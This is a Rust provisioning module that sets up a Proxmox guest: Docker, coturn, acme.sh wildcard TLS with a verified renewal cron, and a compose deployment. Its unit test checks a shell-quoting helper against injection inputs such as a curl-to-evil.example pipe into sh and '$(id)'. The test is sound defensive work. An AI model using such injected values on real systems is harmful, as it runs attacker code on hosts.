//! What happens inside the guest once it exists.
//!
//! Every step is written to be a no-op on a second run — that is the whole
//! point of the milestone, and it is asserted in the tests by running the
//! flow twice against a fake that reports everything as already present.

use anyhow::{bail, Context};

use crate::proxmox::Proxmox;

/// Packages the guest needs before anything else can be installed.
const BASE_PACKAGES: &str = "ca-certificates curl gnupg openssl cron";

pub struct Secrets {
    pub cf_token: String,
    pub acme_email: String,
    pub acme_domain: String,
    pub turn_user: String,
    pub turn_pass: String,
    pub turn_realm: String,
}

impl Secrets {
    /// Reads the values provisioning needs from the environment.
    ///
    /// They come from `.env`, which is gitignored. Nothing here is ever
    /// written to the repo, echoed to the log, or baked into an image.
    pub fn from_env() -> anyhow::Result<Self> {
        fn req(key: &str) -> anyhow::Result<String> {
            std::env::var(key)
                .ok()
                .map(|v| v.trim().to_string())
                .filter(|v| !v.is_empty() && v != "changeme")
                .ok_or_else(|| {
                    anyhow::anyhow!("{key} is not set (copy .env.example to .env and fill it in)")
                })
        }

        let acme_domain = req("ACME_DOMAIN")?;
        Ok(Self {
            cf_token: req("CF_Token")?,
            acme_email: req("ACME_EMAIL")?,
            turn_user: req("SPEEDTEST_TURN_USER").or_else(|_| req("TURN_USER"))?,
            turn_pass: req("SPEEDTEST_TURN_PASS").or_else(|_| req("TURN_PASS"))?,
            turn_realm: std::env::var("TURN_REALM")
                .ok()
                .map(|v| v.trim().to_string())
                .filter(|v| !v.is_empty())
                .unwrap_or_else(|| acme_domain.clone()),
            acme_domain,
        })
    }
}

/// Brings the guest's package set up to date and installs the basics.
pub async fn install_base(pve: &Proxmox<'_>, vmid: u32) -> anyhow::Result<()> {
    tracing::info!("guest: base packages");
    pve.exec_checked(
        vmid,
        &format!(
            "export DEBIAN_FRONTEND=noninteractive; \
             apt-get update -qq && apt-get install -y -qq {BASE_PACKAGES} >/dev/null"
        ),
    )
    .await
    .context("installing base packages")?;
    Ok(())
}

/// Installs Docker from Docker's own repository, skipping if already present.
pub async fn install_docker(pve: &Proxmox<'_>, vmid: u32) -> anyhow::Result<()> {
    if pve
        .exec(
            vmid,
            "command -v docker >/dev/null && docker compose version >/dev/null",
        )
        .await?
        .succeeded()
    {
        tracing::info!("guest: docker already present");
        return Ok(());
    }

    tracing::info!("guest: installing docker");
    // Debian's own docker.io package has no compose plugin, so use upstream.
    let script = r#"
set -euo pipefail
export DEBIAN_FRONTEND=noninteractive
install -m 0755 -d /etc/apt/keyrings
if [ ! -f /etc/apt/keyrings/docker.asc ]; then
  curl -fsSL https://download.docker.com/linux/debian/gpg -o /etc/apt/keyrings/docker.asc
  chmod a+r /etc/apt/keyrings/docker.asc
fi
. /etc/os-release
echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/debian ${VERSION_CODENAME} stable" \
  > /etc/apt/sources.list.d/docker.list
apt-get update -qq
apt-get install -y -qq docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin >/dev/null
systemctl enable --now docker
"#;
    pve.exec_checked(vmid, script)
        .await
        .context("installing docker")?;

    // Prove it actually works rather than assuming the install succeeded.
    pve.exec_checked(vmid, "docker compose version")
        .await
        .context("docker installed but `docker compose` does not run")?;
    Ok(())
}

/// Installs coturn and renders its configuration.
pub async fn install_coturn(
    pve: &Proxmox<'_>,
    vmid: u32,
    template_local_path: &std::path::Path,
    installer_local_path: &std::path::Path,
    listen_ip: &str,
    s: &Secrets,
) -> anyhow::Result<()> {
    tracing::info!("guest: coturn");

    // Stage on the node, then push into the guest.
    let node_tmpl = "/tmp/speedtest-turnserver.conf.template";
    let node_inst = "/tmp/speedtest-install-coturn.sh";
    push_local(
        pve,
        vmid,
        template_local_path,
        node_tmpl,
        "/opt/speedtest/turnserver.conf.template",
    )
    .await?;
    push_local(
        pve,
        vmid,
        installer_local_path,
        node_inst,
        "/opt/speedtest/install-coturn.sh",
    )
    .await?;

    pve.exec_checked(vmid, "chmod +x /opt/speedtest/install-coturn.sh")
        .await?;

    // Credentials go in as environment on the command itself, never written to
    // a file on the guest by us — the installer renders them into
    // /etc/turnserver.conf with mode 600 and nothing else keeps a copy.
    let cmd = format!(
        "TURN_USER={user} TURN_PASS={pass} TURN_REALM={realm} LISTEN_IP={ip} \
         /opt/speedtest/install-coturn.sh",
        user = sh(&s.turn_user),
        pass = sh(&s.turn_pass),
        realm = sh(&s.turn_realm),
        ip = sh(listen_ip),
    );
    pve.exec_checked(vmid, &cmd)
        .await
        .context("installing coturn")?;
    Ok(())
}

/// Issues the wildcard certificate and — crucially — verifies the renewal
/// schedule actually exists afterwards.
pub async fn setup_tls(pve: &Proxmox<'_>, vmid: u32, s: &Secrets) -> anyhow::Result<()> {
    tracing::info!("guest: TLS via ACME DNS-01");

    let dest = "/etc/speedtest/tls";

    // acme.sh reads CF_Token from the environment. Persisting it to a
    // root-only file is what lets the cron renewal work unattended.
    let write_env = format!(
        "install -d -m 700 /root && umask 077 && printf 'export CF_Token=%s\\n' {} > /root/.acme-dns.env",
        sh(&s.cf_token)
    );
    pve.exec_checked(vmid, &write_env)
        .await
        .context("writing the ACME DNS credentials")?;

    let install = format!(
        r#"
set -euo pipefail
export DEBIAN_FRONTEND=noninteractive
. /root/.acme-dns.env
ACME=/root/.acme.sh/acme.sh
if [ ! -x "$ACME" ]; then
  curl -fsS https://get.acme.sh | sh -s email={email} >/dev/null
fi
"$ACME" --set-default-ca --server letsencrypt >/dev/null
# acme.sh installs its own daily cron; drop it so ours is the only schedule.
crontab -l 2>/dev/null | grep -v '.acme.sh' | crontab - || true
install -d -m 700 {dest}
if ! "$ACME" --list 2>/dev/null | grep -q '\*\.{domain}'; then
  "$ACME" --issue --dns dns_cf -d '*.{domain}' -d '{domain}' --keylength ec-256
fi
"$ACME" --install-cert -d '*.{domain}' --ecc \
  --fullchain-file {dest}/fullchain.pem \
  --key-file {dest}/privkey.pem \
  --reloadcmd 'cd /opt/speedtest && docker compose restart app'
chmod 600 {dest}/*.pem
"#,
        email = sh(&s.acme_email),
        domain = s.acme_domain,
        dest = dest,
    );
    pve.exec_checked(vmid, &install)
        .await
        .context("issuing the certificate")?;

    // The renewal schedule, installed idempotently.
    let cron =
        "30 0 * * 0 /root/.acme.sh/acme.sh --cron --home /root/.acme.sh >> /var/log/acme.log 2>&1";
    let install_cron = format!(
        "touch /var/log/acme.log && chmod 600 /var/log/acme.log; \
         ( crontab -l 2>/dev/null | grep -v -F 'acme.sh --cron'; echo {} ) | crontab -",
        sh(cron)
    );
    pve.exec_checked(vmid, &install_cron)
        .await
        .context("installing the renewal cron")?;

    verify_renewal_scheduled(pve, vmid, dest).await
}

/// Confirms renewal is genuinely scheduled.
///
/// This exists because the predecessor host has an installed ACME client, a
/// valid certificate, and **no cron entry and no timer** — its install script
/// reported success and left no schedule behind. Trusting the installer's own
/// output is exactly how that goes unnoticed until the certificate expires.
pub async fn verify_renewal_scheduled(
    pve: &Proxmox<'_>,
    vmid: u32,
    tls_dir: &str,
) -> anyhow::Result<()> {
    let cron = pve.exec(vmid, "crontab -l 2>/dev/null || true").await?;
    if !cron.stdout.contains("acme.sh --cron") {
        bail!(
            "certificate renewal is NOT scheduled: root's crontab has no `acme.sh --cron` \
             entry. This is precisely the state the predecessor host was found in — a valid \
             certificate that nothing will ever renew. Current crontab:\n{}",
            cron.stdout.trim()
        );
    }

    let cert = pve
        .exec(
            vmid,
            &format!("openssl x509 -in {tls_dir}/fullchain.pem -noout -subject -enddate"),
        )
        .await?;
    if !cert.succeeded() {
        bail!(
            "no readable certificate at {tls_dir}/fullchain.pem: {}",
            cert.stderr.trim()
        );
    }

    // A schedule that renews the certificate but never tells the service is
    // only half a renewal: the process keeps serving the old material until
    // something restarts it by hand — which is the sort of thing nobody
    // notices for 90 days.
    let hook = pve
        .exec(
            vmid,
            "grep -rh Le_ReloadCmd /root/.acme.sh/*/*.conf 2>/dev/null || true",
        )
        .await?;
    if !hook.stdout.contains("docker compose restart") {
        tracing::warn!(
            "the ACME reload hook does not restart the service, so a renewed \
             certificate would not be served until the container is restarted by hand"
        );
    }

    tracing::info!(
        "guest: renewal scheduled; {}",
        cert.stdout.trim().replace('\n', " ")
    );
    Ok(())
}

/// Deploys the application with compose.
pub async fn deploy_app(
    pve: &Proxmox<'_>,
    vmid: u32,
    compose_local: &std::path::Path,
    config_local: &std::path::Path,
    env_body: &str,
) -> anyhow::Result<()> {
    tracing::info!("guest: deploying the application");

    push_local(
        pve,
        vmid,
        compose_local,
        "/tmp/speedtest-compose.yml",
        "/opt/speedtest/docker-compose.yml",
    )
    .await?;
    push_local(
        pve,
        vmid,
        config_local,
        "/tmp/speedtest-config.toml",
        "/opt/speedtest/config/speedtest.toml",
    )
    .await?;

    // The .env is written with a restrictive umask; it holds the TURN password.
    let write_env = format!(
        "install -d -m 750 /opt/speedtest && umask 077 && cat > /opt/speedtest/.env <<'SPEEDTEST_ENV_EOF'\n{env_body}\nSPEEDTEST_ENV_EOF"
    );
    pve.exec_checked(vmid, &write_env)
        .await
        .context("writing the deploy .env")?;

    pve.exec_checked(
        vmid,
        "cd /opt/speedtest && docker compose pull -q && docker compose up -d",
    )
    .await
    .context("starting the application")?;
    Ok(())
}

/// Waits for the service to answer its own health check.
pub async fn wait_for_health(pve: &Proxmox<'_>, vmid: u32, attempts: u32) -> anyhow::Result<()> {
    for i in 1..=attempts {
        let out = pve
            .exec(vmid, "curl -fsS http://127.0.0.1:8080/api/health")
            .await?;
        if out.succeeded() && out.stdout.trim() == "ok" {
            tracing::info!("guest: application healthy");
            return Ok(());
        }
        if i < attempts {
            tokio::time::sleep(std::time::Duration::from_secs(2)).await;
        }
    }
    let logs = pve
        .exec(vmid, "cd /opt/speedtest && docker compose logs --tail 40")
        .await?;
    bail!(
        "the application did not become healthy after {attempts} attempts. Container logs:\n{}",
        logs.stdout.trim()
    );
}

/// Stages a local file on the node, pushes it into the guest, and tidies up.
async fn push_local(
    pve: &Proxmox<'_>,
    vmid: u32,
    local: &std::path::Path,
    node_tmp: &str,
    guest_path: &str,
) -> anyhow::Result<()> {
    pve.upload_to_node(local, node_tmp).await?;
    pve.push(vmid, node_tmp, guest_path).await?;
    // Leaving staged copies on the hypervisor would scatter config around a
    // machine this tool otherwise only reads from.
    let _ = pve.run_raw(&["rm", "-f", node_tmp]).await;
    Ok(())
}

/// Single-quotes a value for a POSIX shell.
fn sh(s: &str) -> String {
    format!("'{}'", s.replace('\'', r"'\''"))
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Asks a real shell what it actually received, rather than pattern-matching
    /// the escaped text — see the equivalent helper in `runner.rs` for why.
    #[cfg(unix)]
    fn roundtrip_through_shell(s: &str) -> String {
        let out = std::process::Command::new("/bin/sh")
            .arg("-c")
            .arg(format!("printf '%s' {}", sh(s)))
            .output()
            .expect("running /bin/sh");
        String::from_utf8_lossy(&out.stdout).into_owned()
    }

    #[cfg(unix)]
    #[test]
    fn secrets_reach_the_guest_exactly_as_written() {
        // A TURN password and an ACME token are operator-chosen and may contain
        // anything. Getting this wrong either corrupts the credential silently
        // or executes part of it on the guest.
        for secret in [
            "simple",
            "with space",
            "'; curl evil.example | sh; #",
            "p@ss'w0rd",
            "$(id)",
            "base64+/=padding==",
            "a\tb",
        ] {
            assert_eq!(
                roundtrip_through_shell(secret),
                secret,
                "secret was altered or interpreted: {secret:?}"
            );
        }
    }
}
